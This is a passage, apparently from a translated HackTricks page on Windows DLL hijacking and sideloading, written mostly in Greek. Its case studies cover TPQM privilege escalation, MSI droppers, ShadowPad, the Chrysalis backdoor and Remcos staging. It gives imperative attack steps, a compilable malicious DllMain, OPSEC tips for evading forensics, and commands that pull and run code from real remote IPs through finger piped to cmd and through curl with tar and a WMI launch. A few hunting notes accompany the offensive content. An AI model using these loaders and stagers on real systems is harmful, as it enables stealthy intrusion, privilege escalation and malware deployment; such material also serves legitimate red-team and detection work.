return TRUE;
}
```
### Attack Flow

1. Ως standard user, τοποθέτησε το `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περίμενε να εκτελεστεί το scheduled task στις 9:30 AM υπό το context του τρέχοντος χρήστη.
3. Αν υπάρχει logged-in administrator όταν εκτελεστεί το task, το malicious DLL θα τρέξει στο session του administrator με medium integrity.
4. Αλυσίδωσε standard UAC bypass techniques για να ανέβεις από medium integrity σε SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Οι threat actors συχνά συνδυάζουν MSI-based droppers με DLL side-loading για να εκτελέσουν payloads υπό ένα trusted, signed process.

Chain overview
- Ο χρήστης κατεβάζει MSI. Ένα CustomAction εκτελείται αθόρυβα κατά τη διάρκεια του GUI install (π.χ. LaunchApplication ή μια VBScript action), ανακατασκευάζοντας το επόμενο στάδιο από embedded resources.
- Ο dropper γράφει ένα legitimate, signed EXE και ένα malicious DLL στον ίδιο directory (παράδειγμα ζεύγους: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Όταν ξεκινά το signed EXE, το Windows DLL search order φορτώνει πρώτα το wsc.dll από το working directory, εκτελώντας attacker code υπό ένα signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Ψάξε για entries που εκτελούν executables ή VBScript. Παράδειγμα suspicious pattern: LaunchApplication που εκτελεί ένα embedded file στο background.
- Στο Orca (Microsoft Orca.exe), έλεγξε τα CustomAction, InstallExecuteSequence και Binary tables.
- Embedded/split payloads στο MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ή χρησιμοποίησε lessmsi: lessmsi x package.msi C:\out
- Ψάξε για multiple small fragments που concatenated και decrypted από ένα VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Drop these two files in the same folder:
- wsc_proxy.exe: νόμιμος υπογεγραμμένος host (Avast). Η διεργασία προσπαθεί να φορτώσει το wsc.dll με βάση το όνομά του από τον κατάλογό του.
- wsc.dll: DLL του επιτιθέμενου. Αν δεν απαιτούνται συγκεκριμένα exports, το DllMain μπορεί να αρκεί· διαφορετικά, φτιάξτε ένα proxy DLL και κάντε forward τα απαιτούμενα exports στη γνήσια βιβλιοθήκη ενώ το payload τρέχει στο DllMain.
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Για export requirements, use a proxying framework (e.g., DLLirant/Spartacus) to generate a forwarding DLL that also executes your payload.

- Αυτή η technique βασίζεται στο DLL name resolution από το host binary. Αν ο host χρησιμοποιεί absolute paths ή safe loading flags (π.χ. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
- Τα KnownDLLs, SxS και forwarded exports μπορούν να επηρεάσουν την precedence και πρέπει να λαμβάνονται υπόψη κατά την επιλογή του host binary και του export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Η Check Point περιέγραψε πώς το Ink Dragon αναπτύσσει ShadowPad χρησιμοποιώντας ένα **three-file triad** για να περνά απαρατήρητο μαζί με legitimate software, κρατώντας παράλληλα το core payload encrypted στο disk:

1. **Signed host EXE** – vendors όπως AMD, Realtek ή NVIDIA κακοποιούνται (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι attackers μετονομάζουν το executable ώστε να μοιάζει με Windows binary (για παράδειγμα `conhost.exe`), αλλά η Authenticode signature παραμένει valid.
2. **Malicious loader DLL** – dropped δίπλα στο EXE με αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Η DLL είναι συνήθως ένα MFC binary obfuscated με το ScatterBrain framework· ο μοναδικός της ρόλος είναι να εντοπίσει το encrypted blob, να το decrypt και να mapάρει reflective το ShadowPad.
3. **Encrypted payload blob** – συχνά αποθηκευμένο ως `<name>.tmp` στον ίδιο directory. Μετά το memory-mapping του decrypted payload, ο loader διαγράφει το TMP file για να καταστρέψει forensic evidence.

Tradecraft notes:

* Η μετονομασία του signed EXE (ενώ διατηρείται το αρχικό `OriginalFileName` στο PE header) του επιτρέπει να παριστάνει ένα Windows binary αλλά να κρατά το vendor signature, οπότε αντέγραψε τη συνήθεια του Ink Dragon να ρίχνει binaries που μοιάζουν με `conhost.exe` αλλά στην πραγματικότητα είναι AMD/NVIDIA utilities.
* Επειδή το executable παραμένει trusted, τα περισσότερα allowlisting controls χρειάζεται μόνο να έχουν τη malicious DLL δίπλα του. Επικεντρώσου στο customizing του loader DLL· ο signed parent συνήθως μπορεί να τρέξει untouched.
* Ο decryptor του ShadowPad περιμένει το TMP blob να βρίσκεται δίπλα στον loader και να είναι writable ώστε να μπορεί να μηδενίσει το file μετά το mapping. Κράτα τον directory writable μέχρι να φορτώσει το payload· μόλις μπει στη memory το TMP file μπορεί να διαγραφεί με ασφάλεια για OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger finger → tar/curl → WMI)

Οι operators συνδυάζουν DLL sideloading με LOLBAS ώστε το μόνο custom artifact στο disk να είναι η malicious DLL δίπλα στο trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell κάνει spawn το `cmd.exe /c`, τραβά commands από Finger server και τα περνά στο `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` τραβά TCP/79 text; το `| cmd` εκτελεί την response του server, επιτρέποντας στους operators να αλλάζουν το δεύτερο stage server-side.

- **Built-in download/extract:** Κατέβασε ένα archive με benign extension, αποσυμπίεσέ το και στήσε το sideload target μαζί με τη DLL κάτω από έναν τυχαίο `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- Το `curl -s -L` κρύβει την πρόοδο και ακολουθεί redirects· το `tar -xf` χρησιμοποιεί το built-in tar των Windows.

- **WMI/CIM launch:** Ξεκίνα το EXE μέσω WMI ώστε η telemetry να δείχνει ένα process που δημιουργήθηκε από CIM ενώ φορτώνει την colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Λειτουργεί με binaries που προτιμούν local DLLs (π.χ. `intelbq.exe`, `nearby_share.exe`)· το payload (π.χ. Remcos) τρέχει κάτω από το trusted name.

- **Hunting:** Alert στο `forfiles` όταν τα `/p`, `/m` και `/c` εμφανίζονται μαζί· είναι ασυνήθιστο εκτός από admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Μια πρόσφατη intrusion του Lotus Blossom εκμεταλλεύτηκε μια trusted update chain για να παραδώσει ένα NSIS-packed dropper που έστησε ένα DLL sideload μαζί με fully in-memory payloads.

Tradecraft flow
- Το `update.exe` (NSIS) δημιουργεί το `%AppData%\Bluetooth`, το μαρκάρει ως **HIDDEN**, ρίχνει ένα renamed Bitdefender Submission Wizard `BluetoothService.exe`, ένα malicious `log.dll`, και ένα encrypted blob `BluetoothService`, και μετά εκκινεί το EXE.
- Το host EXE κάνει import το `log.dll` και καλεί `LogInit`/`LogWrite`. Το `LogInit` mmap-loads το blob· το `LogWrite` το decrypt με custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material derived από ένα προηγούμενο hash), overwriteάρει το buffer με plaintext shellcode, frees temps, και κάνει jump σε αυτό.
- Για να αποφύγει ένα IAT, ο loader λύνει APIs με hashing export names χρησιμοποιώντας **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, και μετά εφαρμόζει ένα Murmur-style avalanche (**0x85EBCA6B**) συγκρίνοντας με salted target hashes.

Main shellcode (Chrysalis)
- Decrypts ένα PE-like main module επαναλαμβάνοντας add/XOR/sub με key `gQ2JR&9;` σε five passes, και μετά φορτώνει δυναμικά `Kernel32.dll` → `GetProcAddress` για να ολοκληρώσει το import resolution.
- Ανασυνθέτει strings ονομάτων DLL runtime μέσω per-character bit-rotate/XOR transforms, και μετά φορτώνει `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Χρησιμοποιεί έναν δεύτερο resolver που διατρέχει το **PEB → InMemoryOrderModuleList**, αναλύει κάθε export table σε 4-byte blocks με Murmur-style mixing, και κάνει fallback στο `GetProcAddress` μόνο αν το hash δεν βρεθεί.

Embedded configuration & C2
- Το config βρίσκεται μέσα στο dropped `BluetoothService` file στο **offset 0x30808** (size **0x980**) και γίνεται RC4-decrypted με key `qwhvb^435h&*7`, αποκαλύπτοντας το C2 URL και το User-Agent.
- Τα beacons χτίζουν ένα dot-delimited host profile, προσθέτουν tag `4Q`, και μετά RC4-encrypt με key `vAuig34%^325hGV` πριν από `HttpSendRequestA` μέσω HTTPS. Τα responses RC4-decryptάρονται και διανέμονται μέσω ενός tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Η execution mode ελέγχεται από CLI args: χωρίς args = install persistence (service/Run key) που δείχνει στο `-i`· το `-i` ξαναεκκινεί το ίδιο process με `-k`· το `-k` παραλείπει το install και τρέχει το payload.

Alternate loader observed
- Η ίδια intrusion έριξε Tiny C Compiler και εκτέλεσε `svchost.exe -nostdlib -run conf.c` από το `C:\ProgramData\USOShared\`, με το `libtcc.dll` δίπλα του. Το attacker-supplied C source ενσωμάτωνε shellcode, το compiled και το εκτέλεσε in-memory χωρίς να αγγίξει το disk με PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Αυτό το TCC-based compile-and-run stage imported `Wininet.dll` at runtime και τράβηξε ένα second-stage shellcode από ένα hardcoded URL, δίνοντας έναν ευέλικτο loader που masquerades as a compiler run.

## Signed-host sideloading with export proxying + host thread parking

Some DLL sideloading chains add **stability engineering** so the legitimate host stays alive long enough to load later stages cleanly instead of crashing after the malicious DLL is loaded.

Observed pattern
- Drop a trusted EXE beside a malicious DLL using the expected dependency name such as `version.dll`.
- The malicious DLL **proxies every expected export** back to the real system DLL (for example `%SystemRoot%\\System32\\version.dll`) so import resolution still succeeds and the host process keeps working.
- After load, the malicious DLL **patches the host entry point** so the main thread falls into an infinite `Sleep` loop instead of exiting or running code paths that would terminate the process.
- A new thread performs the real malicious work: decrypting the next-stage DLL name or path (RC4/XOR are common), then launching it with `LoadLibrary`.

Why this matters
- Normal DLL proxying preserves API compatibility, but it doesn't guarantee the host stays alive long enough for later stages.
- Parking the main thread in `Sleep(INFINITE)` is a simple way to keep the signed process resident while the loader performs decryption, staging, or network bootstrap in a worker thread.
- Hunting only for a suspicious `DllMain` miss this pattern if the interesting behavior happens after the host entry point is patched and a secondary thread starts.

Minimal workflow
1. Copy the signed host EXE and determine the DLL it resolves from the local directory.
2. Build a proxy DLL exporting the same functions and forwarding them to the legitimate DLL.
3. In `DllMain(DLL_PROCESS_ATTACH)`, create a worker thread.
4. From that thread, patch the host entry point or main thread start routine so it loops on `Sleep`.
5. Decrypt the next-stage DLL name/config and call `LoadLibrary` or manual-map the payload.

Defensive pivots
- Signed processes loading `version.dll` or similarly common libraries from their own application directory instead of `System32`.
- Memory patches at the process entry point shortly after image load, especially jumps/calls redirected to `Sleep`/`SleepEx`.
- Threads created by a proxy DLL that immediately call `LoadLibrary` on a second DLL with a decrypted name.
- Full-export proxy DLLs placed next to vendor executables inside writable staging directories such as `ProgramData`, `%TEMP%`, or unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
